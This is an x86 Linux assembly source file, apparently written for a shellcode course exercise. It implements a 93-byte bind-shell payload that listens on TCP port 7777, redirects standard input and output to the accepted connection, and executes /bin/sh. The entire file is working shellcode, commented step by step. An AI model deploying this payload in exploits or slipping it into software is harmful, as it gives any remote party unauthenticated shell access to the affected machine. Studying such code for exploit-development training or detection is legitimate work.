; Title: Linux x86 Shell Bind TCP port 7777 shellcode (93 bytes)
; File: linux_x86_shell_bind_tcp_7777.asm
; Author: Guillaume Kaddouch
; GitHub: https://github.com/gkweb76/SLAE
; SLAE-681


global _start

section .text

_start:
	; Socket creation and handling with socketcall()
	; socketcall(int call, unsigned long *args)

	; 1 - creating socket
	; int socket(int domain, int type, int protocol)
	; socketfd = socket(2, 1, 0)

	; eax = 0x66 = socketcall()
	; ebx = 0x1 = socket()
	; ecx = ptr to socket's args

	xor ebx, ebx			; zero out ebx
	mul ebx					; implicit operand eax: zero out eax
	mov al, 0x66			; 0x66 = 102 = socketcall()
	push ebx				; 3rd arg: socket protocol = 0
	mov bl, 0x1				; ebx = 1 = socket() function
	push byte 0x1			; 2nd arg: socket type = 1 (SOCK_STREAM)
	push byte 0x2			; 1st arg: socket domain = 2 (AF_INET)
	mov ecx, esp			; copy stack structure's address to ecx (pointer)
	int 0x80				; eax = socket(AF_INET, SOCK_STREAM, 0)


	; 2 - binding port
	; int bind(int sockfd, const struct sockaddr *addr[sin_family, sin_port, sin_addr] , socklen_t addrlen)
	; bind(socketfd, [2, 24862, 0], 16)

	; eax = 0x66 = socketcall()
	; ebx = 0x2 = bind()
	; ecx = ptr to bind's args

	xchg edi, eax			; save socketfd into edi
	mov al, 0x66			; 0x66 = 102 = socketcall()
	pop ebx					; ebx = 2 = bind()
	pop esi					; esi = 1
	push edx				; edx = 0 (INADDR_ANY) = host 0.0.0.0
	push word 0x611e		; sin_port = 24862 = port 7777
	push word bx			; sin_family = 2 (AF_INET)
	push byte 16			; addr_len = 16 (structure size)
	push ecx				; ecx = esp = ptr to args struture
	push edi				; socketfd. Stack is now [0, 24862, 2], 16, *ptr, socketfd
	mov ecx, esp			; save esp into ecx, points to socketfd
	int 0x80				; eax = bind(socketfd, *addr[SYS_BIND, 7777, 0.0.0.0], 16) = 0 (on success)


	; 3 - listening
	; int listen(int sockfd, int backlog)
	; listen(socketfd, 0)

 	; eax = 0x66 = socketcall()
        ; ebx = 0x4 = listen()
	; ecx = ptr to socketfd

	xor edi, edi			; from now on we will use edi to push NULLs on stack
	pop edx					; save socketfd
	push edi				; 2nd arg: 0X0 = backlog
	push edx				; 1st arg = socketfd
	mov bl, 0x4				; ebx = 4 = listen()
	mov ecx, esp			; ptr to args structure on stack (socketfd, 0)
	mov al, 0x66			; 0x66 = 102 = socketcall()
	int 0x80				; listen(socketfd, 0)


	; 4 - accept
	; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)
	; accept(socketfd, 0, 0)

	; eax = 0x66 = socketcall()
	; ebx = 0x5 = accept()
	; ecx = ptr to socketfd

	push edi				; 3rd arg: addrlen = 0x0
	push edi				; 2nd arg: addr = 0x0
	push edx				; 1st arg: previously saved socketfd
	mov ecx, esp			; ecx points to socketfd
	mov bl, 0x5				; ebx = 5 = accept()
	mov al, 0x66			; 0x66 = 102 = socketcall()
	int 0x80				; accept(socketfd, 0, 16)


	; 5 - dup2
	; int dup2(int oldfd, int newfd)
	; duplicate our socketfd into fd from 14 to 0  (stdin = 0, stdout = 1, stderror = 2)
	; stdin/stdout/stderror become the TCP connection

	xchg eax, ebx			; eax = 5, ebx = accepted_socketfd
	pop ecx					; ecx = 14

dup_jump:
	mov al, 0x3f			; eax = 63 = dup2()
	int 0x80				; dup2(accepted_socketfd, 14)
	dec ecx					; decrement ecx (newfd)
	jns dup_jump			; loop until newfd is 0 (= stdin)


	; 6 - execve /bin/sh
	; execve(const char *filename, char *const argv [], char *const envp[])
	; execve(/bin//sh, &/bin//sh, 0)

	push edi
	push dword 0x68732f2f	; push //sh
	push dword 0x6e69622f	; push /bin (=/bin//sh)
	mov ebx, esp			; store ptr to /bin//sh into ebx
	push edi				; eax = 0X00000000
	mov edx, esp			; ptr to an empty array
	push ebx				; pointer to /bin//sh. Stack = 0X00, /bin//sh, 0X00000000, &/bin//sh
	mov ecx, esp			; ecx points to argv
	mov al, 0xb
	int 0x80				; execve /bin/sh
